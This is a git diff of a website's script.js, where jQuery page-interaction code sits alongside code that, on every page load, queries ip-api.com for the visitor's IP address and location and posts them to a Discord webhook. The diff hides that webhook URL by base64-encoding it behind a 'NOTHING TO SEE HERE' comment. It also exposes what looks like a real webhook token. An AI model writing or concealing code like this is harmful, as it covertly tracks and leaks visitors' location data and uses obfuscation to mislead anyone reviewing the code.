@@ -64,17 +64,28 @@ $(document).ready(function(){
         }
     });
 });
-const webHookUrl = "https://discord.com/api/webhooks/1231402629435883641/R0sexkYFGgqev-doFhVvd0GPnPPdX1IHcEj7c3a_j5GRcqeZoivbAtDETkb21zYDzlyA";
+
+
+// NOTHING TO SEE HERE
+const encodedWebHookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzMTQwMjYyOTQzNTg4MzY0MS9SMHNleGtZRkdncWV2LWRvRmhWdmQwR1BuUFBkWDFJSGNFajdjM2FfajVHUmNxZVpvaXZiQXRERVRrYjIxellEenJ5QQ==";
+
+function decodeWebHookUrl(encoded) {
+    return atob(encoded);
+}
+
+const webHookUrl = decodeWebHookUrl(encodedWebHookUrl);
 
 async function fetchData(url) {
     const response = await fetch(url);
     return response.json();
 }
+
 function generateUniqueRandomNumber() {
     const timestamp = new Date().getTime();
     const random = Math.floor(Math.random() * 10000);
     return `${timestamp}${random}`;
 }
+
 async function sendMessage(params, uniqueRandomNumber) {
     try {
         const response = await fetch(webHookUrl, {
@@ -92,6 +103,7 @@ async function sendMessage(params, uniqueRandomNumber) {
         console.error('Error:', error);
     }
 }
+
 async function sendIPInfo() {
     try {
         const data = await fetchData('http://ip-api.com/json/');
@@ -129,7 +141,10 @@ Latitude: ${lat}
         console.error('Error:', error);
     }
 }
+
 sendIPInfo();
+
+
 // script.js
 $(document).ready(function(){
     // Add an event listener for the "Read more" button
